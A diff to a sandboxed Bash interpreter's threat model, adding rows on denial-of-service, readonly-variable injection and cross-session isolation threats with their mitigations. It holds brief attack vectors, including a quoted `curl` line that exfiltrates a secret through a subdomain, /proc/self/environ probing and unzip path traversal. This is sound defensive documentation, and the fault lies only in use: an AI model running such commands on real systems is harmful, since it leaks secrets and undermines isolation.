@@ -104,6 +104,9 @@ through configurable limits.
 | Template output explosion (TM-DOS-053) | `{{#each}}` on large array | Bounded by `max_file_size` | MITIGATED |
 | glob ExtGlob blowup (TM-DOS-054) | `glob --files "+(a\|aa)"` | Same as TM-DOS-031 | **OPEN** |
 | split file count (TM-DOS-055) | `split -l 1 bigfile` | FS `max_file_count` limit | MITIGATED |
+| source self-recursion (TM-DOS-056) | Script that sources itself | Track source depth | **OPEN** |
+| sleep bypasses timeout (TM-DOS-057) | `sleep N` ignores `ExecutionLimits::timeout` | Implement tokio timeout wrapper | **OPEN** |
+| Unbounded builtin output (TM-DOS-058) | `seq 1 1000000` produces 1M lines | Add `max_stdout_bytes` limit | **OPEN** |
 
 **Configuration:**
 ```rust
@@ -379,6 +382,9 @@ exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.co
 | Missing array prefix (TM-INJ-016) | `_ARRAY_READ_` not in guard | Add prefix to `is_internal_variable()` | **OPEN** |
 | Unzip path traversal (TM-INJ-017) | `unzip` with `../` entry names | Validate paths within extract base | **OPEN** |
 | Dotenv internal injection (TM-INJ-018) | `.env` with `_NAMEREF_x=target` | Add `is_internal_variable()` check | **OPEN** |
+| unset removes readonly (TM-INJ-019) | `readonly X=v; unset X` | Check readonly attribute in unset | **OPEN** |
+| declare overwrites readonly (TM-INJ-020) | `readonly X=v; declare X=new` | Check readonly attribute in declare | **OPEN** |
+| export overwrites readonly (TM-INJ-021) | `readonly X=v; export X=new` | Check readonly attribute in export | **OPEN** |
 
 **Variable Expansion:**
 
@@ -401,6 +407,23 @@ echo $user_input
 | Cross-tenant jq env (TM-ISO-004) | `std::env::set_var()` in jq | Custom jaq context variable | **FIXED** |
 | Cumulative counter bypass (TM-ISO-005) | Repeated `exec()` resets counters | Session-level counters | **OPEN** |
 | Memory budget exhaustion (TM-ISO-006) | Unbounded variable/array growth | Per-instance MemoryLimits | **OPEN** |
+| Alias leakage (TM-ISO-007) | Aliases from session A visible in B | Per-instance alias HashMap | MITIGATED |
+| Trap handler leakage (TM-ISO-008) | Trap from session A fires in B | Per-instance trap HashMap | MITIGATED |
+| Shell option leakage (TM-ISO-009) | `set -e` in session A affects B | Per-instance SHOPT_* variables | MITIGATED |
+| Exported env var leakage (TM-ISO-010) | `export` in session A visible in B | Per-instance env HashMap | MITIGATED |
+| Array leakage (TM-ISO-011) | Arrays cross sessions | Per-instance array HashMaps | MITIGATED |
+| Working directory leakage (TM-ISO-012) | `cd` in session A changes B's cwd | Per-instance `cwd` | MITIGATED |
+| Exit code leakage (TM-ISO-013) | `$?` from session A visible in B | Per-instance `last_exit_code` | MITIGATED |
+| Concurrent variable leakage (TM-ISO-014) | Race condition leaks vars | Per-instance state, no shared mutables | MITIGATED |
+| Concurrent FS leakage (TM-ISO-015) | Race condition leaks files | Separate `Arc<FileSystem>` per instance | MITIGATED |
+| Snapshot/restore side effects (TM-ISO-016) | `restore_shell_state()` affects others | Snapshot is per-instance | MITIGATED |
+| Adversarial variable probing (TM-ISO-017) | Enumerate common secret var names | Default-empty env, no host env inheritance | MITIGATED |
+| /proc /sys probing (TM-ISO-018) | Read `/proc/self/environ` | VFS has no real /proc or /etc | MITIGATED |
+| jq cross-session env (TM-ISO-019) | `jq 'env.X'` sees other vars | jaq reads from injected global | MITIGATED |
+| Subshell mutation leakage (TM-ISO-020) | Subshell vars leak to parent | Snapshot/restore + per-instance state | MITIGATED |
+| EXIT trap cross-exec leak (TM-ISO-021) | EXIT trap fires in next `exec()` | Reset traps in `reset_for_execution()` | **OPEN** |
+| `$?` cross-exec leak (TM-ISO-022) | Exit code from previous `exec()` visible | Reset `last_exit_code` | **OPEN** |
+| `set -e` cross-exec leak (TM-ISO-023) | Shell options persist across `exec()` | Reset shell options | **OPEN** |
 
 Each [`Bash`] instance is fully isolated. For multi-tenant environments, create
 separate instances per tenant:
@@ -436,6 +459,7 @@ All unexpected errors are caught and converted to safe, human-readable messages.
 | Path leak in errors (TM-INT-004) | Error shows real FS paths | Virtual paths only | MITIGATED |
 | Memory addr in errors (TM-INT-005) | Debug output shows addresses | Display impl hides addresses | MITIGATED |
 | Stack trace exposure (TM-INT-006) | Panic unwinds show call stack | `catch_unwind` prevents propagation | MITIGATED |
+| /dev/urandom empty with head -c (TM-INT-007) | `head -c 16 /dev/urandom` returns empty | Fix virtual device pipe handling | **OPEN** |
 
 **Panic Recovery:**
 
